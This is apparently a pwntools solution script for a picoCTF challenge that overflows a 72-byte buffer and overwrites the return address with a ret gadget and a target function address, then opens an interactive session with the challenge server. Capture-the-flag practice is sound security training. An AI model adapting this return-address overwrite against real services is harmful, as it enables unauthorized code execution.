from pwn import *

context.bits = 64

p = remote("saturn.picoctf.net", 53017)

payload = b"A"*72
payload += p64(0x000000000040101a)
payload += p64(0x0000000000401236)

p.sendline(payload)
p.interactive()
